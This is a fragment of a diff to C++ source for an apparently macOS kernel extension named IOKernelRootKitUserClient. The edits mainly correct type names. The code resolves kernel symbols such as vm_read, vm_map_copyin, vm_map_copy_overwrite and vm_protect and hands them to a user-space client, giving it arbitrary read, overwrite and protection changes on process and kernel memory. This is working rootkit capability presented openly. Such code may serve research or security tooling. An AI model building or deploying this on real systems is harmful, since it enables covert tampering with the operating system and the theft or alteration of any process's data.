@@ -859,13 +859,13 @@ IOReturn IOKernelRootKitUserClient::externalMethod(UInt32 selector, IOExternalMe
 
 					Size data_size;
 
-					UInt8 *buf = this->getUserSpaceBuffer(data, size, kIODirectionOutIn, &descriptor, &mapping);
+					UInt8 *buf = this->mapBufferFromClientTask(data, size, kIODirectionOutIn, &descriptor, &mapping);
 
 					if(address != 0)
 					{
-						kern_return_t (*_vm_read)(vm_map_t, vm_address_t, vm_offset_t, vm_address_t, vm_Size*);
+						kern_return_t (*_vm_read)(vm_map_t, vm_address_t, vm_offset_t, vm_address_t, vm_size_t*);
 
-						_vm_read = (kern_return_t(*)(vm_map_t, vm_address_t, vm_offset_t, vm_address_t, vm_Size*)) vm_read_;
+						_vm_read = (kern_return_t(*)(vm_map_t, vm_address_t, vm_offset_t, vm_address_t, vm_size_t*)) vm_read_;
 
 						kr = _vm_read(map, address, size, (vm_address_t) buf, &data_size);
 
@@ -947,7 +947,7 @@ IOReturn IOKernelRootKitUserClient::externalMethod(UInt32 selector, IOExternalMe
 					{
 						int                     type;
 						vm_object_offset_t      offset;
-						vm_map_Size           size;
+						vm_map_size_t           size;
 						void                    *kdata;
 					};
 
@@ -957,17 +957,17 @@ IOReturn IOKernelRootKitUserClient::externalMethod(UInt32 selector, IOExternalMe
 					{
 						vm_map_copy_t copy;
 
-						typedef kern_return_t (*vm_map_copyin)(vm_map_t, vm_map_address_t, vm_map_Size, boolean_t, vm_map_copy_t*);
+						typedef kern_return_t (*vm_map_copyin)(vm_map_t, vm_map_address_t, vm_map_size_t, boolean_t, vm_map_copy_t*);
 						
-						kern_return_t (*_vm_map_copyin)(vm_map_t, vm_map_address_t, vm_map_Size, boolean_t, vm_map_copy_t*);
+						kern_return_t (*_vm_map_copyin)(vm_map_t, vm_map_address_t, vm_map_size_t, boolean_t, vm_map_copy_t*);
 
 						_vm_map_copyin = reinterpret_cast<vm_map_copyin>(this->kernel->getSymbolAddressByName("_vm_map_copyin"));
 						
-						kr = _vm_map_copyin(src_map, (vm_address_t) data, (vm_map_Size) size, FALSE, &copy);
+						kr = _vm_map_copyin(src_map, (vm_address_t) data, (vm_map_size_t) size, FALSE, &copy);
 
-						typedef kern_return_t (*vm_map_copy_overwrite)(vm_map_t, vm_map_offset_t, vm_map_copy_t, vm_map_Size, boolean_t);
+						typedef kern_return_t (*vm_map_copy_overwrite)(vm_map_t, vm_map_offset_t, vm_map_copy_t, vm_map_size_t, boolean_t);
 
-						kern_return_t (*_vm_map_copy_overwrite)(vm_map_t, vm_map_offset_t, vm_map_copy_t, vm_map_Size, boolean_t);
+						kern_return_t (*_vm_map_copy_overwrite)(vm_map_t, vm_map_offset_t, vm_map_copy_t, vm_map_size_t, boolean_t);
 
 						_vm_map_copy_overwrite = reinterpret_cast<vm_map_copy_overwrite>(this->kernel->getSymbolAddressByName("_vm_map_copy_overwrite"));
 
@@ -1091,9 +1091,9 @@ IOReturn IOKernelRootKitUserClient::externalMethod(UInt32 selector, IOExternalMe
 
 					if(address != 0)
 					{
-						kern_return_t(*_vm_protect)(vm_map_t, vm_address_t, vm_Size, boolean_t, vm_prot_t);
+						kern_return_t(*_vm_protect)(vm_map_t, vm_address_t, vm_size_t, boolean_t, vm_prot_t);
 
-						_vm_protect = (kern_return_t(*)(vm_map_t, vm_address_t, vm_Size, boolean_t, vm_prot_t)) vm_protect_;
+						_vm_protect = (kern_return_t(*)(vm_map_t, vm_address_t, vm_size_t, boolean_t, vm_prot_t)) vm_protect_;
 
 						kr = _vm_protect(map, address, size, true, prot);
 
